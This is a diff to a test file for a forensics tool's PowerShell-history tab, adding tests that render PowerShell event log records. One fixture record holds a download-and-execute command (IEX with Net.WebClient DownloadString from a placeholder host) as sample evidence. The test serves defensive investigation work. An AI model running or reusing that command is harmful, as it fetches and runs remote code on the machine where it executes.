@@ -8,10 +8,13 @@ import { MemoryShellHistoryTab } from "./MemoryShellHistoryTab";
 const getMemoryActiveResultMock = vi.fn();
 const getCommandLineHistoryMock = vi.fn();
 
+const getMemoryPowerShellLogMock = vi.fn();
+
 vi.mock("../../api/client", () => ({
   api: {
     getMemoryActiveResult: (...args: unknown[]) => getMemoryActiveResultMock(...args),
     getCommandLineHistory: (...args: unknown[]) => getCommandLineHistoryMock(...args),
+    getMemoryPowerShellLog: (...args: unknown[]) => getMemoryPowerShellLogMock(...args),
   },
 }));
 
@@ -53,6 +56,8 @@ function renderTab() {
 
 describe("MemoryShellHistoryTab", () => {
   beforeEach(() => {
+    getMemoryPowerShellLogMock.mockReset();
+    getMemoryPowerShellLogMock.mockResolvedValue({ items: [], total: 0, page: 1, page_size: 50 });
     vi.clearAllMocks();
     getCommandLineHistoryMock.mockResolvedValue(commandLines([], null));
   });
@@ -244,5 +249,31 @@ describe("MemoryShellHistoryTab", () => {
     const source = screen.getByTestId("shell-history-source");
     expect(source.textContent).toBe("PowerShell history filebob");
     expect(source.getAttribute("title")).toBe(historyFile);
+  });
+  it("lists PowerShell event log records with their time, event and script block part", async () => {
+    getMemoryActiveResultMock.mockResolvedValue(activeResult());
+    getMemoryPowerShellLogMock.mockResolvedValue({
+      items: [
+        { id: "p1", timestamp: "2025-03-07T19:40:01Z", event_id: 4104, channel: "Microsoft-Windows-PowerShell/Operational", pid: 5404, command: "IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')", part: "1/2" },
+        { id: "p2", timestamp: "2025-03-07T19:40:05Z", event_id: 800, channel: "Windows PowerShell", pid: null, command: "Get-LocalUser", host_application: "powershell.exe" },
+      ],
+      total: 2,
+      page: 1,
+      page_size: 50,
+    });
+    renderTab();
+    await waitFor(() => expect(screen.getAllByTestId("shell-history-powershell-row")).toHaveLength(2));
+    const rows = screen.getAllByTestId("shell-history-powershell-row");
+    expect(rows[0].textContent).toContain("2025-03-07 19:40:01");
+    expect(rows[0].textContent).toContain("4104");
+    expect(rows[0].textContent).toContain("part 1/2");
+    expect(rows[1].textContent).toContain("Get-LocalUser");
+    expect(getMemoryPowerShellLogMock.mock.calls[0].slice(0, 2)).toEqual([CASE, EVIDENCE]);
+  });
+
+  it("says when no PowerShell record was found", async () => {
+    getMemoryActiveResultMock.mockResolvedValue(activeResult());
+    renderTab();
+    expect((await screen.findByTestId("shell-history-powershell-empty")).textContent).toContain("Find Evil");
   });
 });
